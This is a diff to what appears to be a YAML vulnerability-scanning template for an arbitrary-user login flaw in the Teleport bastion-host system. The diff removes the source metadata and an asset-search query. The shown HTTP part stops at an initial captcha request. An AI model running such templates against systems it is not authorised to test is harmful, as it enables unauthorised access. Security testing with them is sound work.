@@ -3,14 +3,8 @@ info:
   name: Teleport堡垒机do-login任意用户登录漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/2f897829349c88af9d3aed8c322a28cb
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: unauth,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 2f897829349c88af9d3aed8c322a28cb
-    fofa: + hunter`app.name="Teleport 堡垒机系统"`
 http:
 - raw:
   - 'GET /auth/captcha?h=36&rnd=0.39124018049760567 HTTP/1.1
